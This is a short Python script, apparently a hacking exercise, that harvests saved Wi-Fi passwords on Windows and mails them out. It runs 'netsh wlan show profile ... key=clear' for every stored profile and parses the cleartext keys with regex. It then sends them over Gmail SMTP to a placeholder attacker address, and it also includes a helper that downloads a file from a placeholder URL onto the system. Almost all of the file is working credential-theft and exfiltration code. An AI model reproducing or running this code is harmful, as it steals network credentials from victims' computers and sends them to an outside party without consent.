import subprocess
import smtplib
import re 
import requests

def get_file(url):
    get_responce = requests.get(url)
    with open("<name_of the file>", "<w|r|wr|wb...>") as output_file: # upon printing the response. For the content we can check which kind of data is present in the file eg. binary data -> that should be write-binary "wb"
        output_file.write(get_responce.content)
get_file("<URL of the file need to download into the system>") 

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message) #here email1 and email2 are sender and receiver, only to check I had used both as my_email
    server.quit()

command = 'netsh wlan show profiles'
result = subprocess.run(command, shell=True, capture_output=True, text=True)
message = result.stdout
patterns = re.compile(r'\s*All User Profile\s*:\s*(\S.*)') #usage of regex for getting the profile names and Key Content from the WLAN report (saved wifi passwords)
matches = patterns.finditer(message)
profile_names = []
password_list = []
for match in matches:
    profile_names.append(match.group(1))
for profile in profile_names:
    command = f'netsh wlan show profile name="{profile}" key=clear'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    profile_details = result.stdout
    patterns2 = re.compile(r'Key Content\s*:\s*(\S.*)')
    new_matches = patterns2.finditer(profile_details)
    for i in new_matches:
        password_list.append(profile +"->"+ i.group(1))
final_data = ' '.join(password_list)
send_mail("<attacker_mail address>", "<app password for attacker_gmail>", final_data)

